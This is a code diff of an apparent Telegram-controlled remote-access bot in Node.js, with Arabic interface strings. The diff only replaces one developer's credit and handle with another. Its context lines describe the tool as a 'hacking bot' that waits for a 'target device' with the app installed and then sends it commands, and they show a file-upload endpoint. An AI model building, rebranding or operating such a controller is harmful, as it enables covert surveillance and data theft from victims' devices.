@@ -25,7 +25,7 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK</h1>')
+    res.send('<h1 align="center">تم بنجاح تشغيل البوت المطور ابن اليمن  𝗘𝗛𝗔𝗕</h1>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
@@ -108,7 +108,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -128,7 +128,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -148,7 +148,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -168,7 +168,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -188,7 +188,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -208,7 +208,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -228,7 +228,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• • ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '• • ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -248,7 +248,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -277,7 +277,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -297,7 +297,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -311,7 +311,7 @@ appBot.on('message', (message) => {
     if (id == chatId) {
         if (message.text == '/start') {
             appBot.sendMessage(id,
-                '°• مرحبا بكم في بوت الاختراق مطور البوت 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK\n\n' +
+                '°• مرحبا بكم في بوت الاختراق مطور البوت ابن اليمن 𝗘𝗛𝗔𝗕\n\n' +
                 '• إذا كان التطبيق مثبتًا على الجهاز المستهدف ، فانتظر الاتصال\n\n' +
                 '• عندما تتلقى رسالة الاتصال ، فهذا يعني أن الجهاز المستهدف متصل وجاهز لاستلام الأمر\n\n' +
                 '• انقر على زر الأمر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب بين الأمر\n\n' +
@@ -437,7 +437,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -456,7 +456,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -475,7 +475,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -494,7 +494,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -513,7 +513,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -532,7 +532,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -551,7 +551,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -570,7 +570,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -589,7 +589,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -608,7 +608,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -627,7 +627,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ابن اليمن 𝗘𝗛𝗔𝗕 ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
